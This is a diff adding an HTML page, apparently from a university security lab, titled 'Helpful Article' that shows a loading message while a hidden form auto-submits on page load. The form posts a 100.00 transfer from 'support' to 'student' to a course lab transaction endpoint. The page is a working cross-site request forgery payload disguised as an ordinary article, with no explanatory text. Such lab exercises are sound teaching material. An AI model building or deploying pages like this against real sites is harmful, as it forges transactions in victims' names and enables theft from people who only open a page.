@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Helpful Article</title>
+</head>
+<body>
+    <h1>Please wait, loading...</h1>
+    <form action="https://2372895.labs.csci3403.com/transaction" method="POST" id="csrf-form" style="display: none;">
+        <input type="hidden" name="sender" value="support" />
+        <input type="hidden" name="recipient" value="student" />
+        <input type="hidden" name="amount" value="100.00" />
+        <!-- Add any other necessary hidden fields that the request might require -->
+    </form>
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
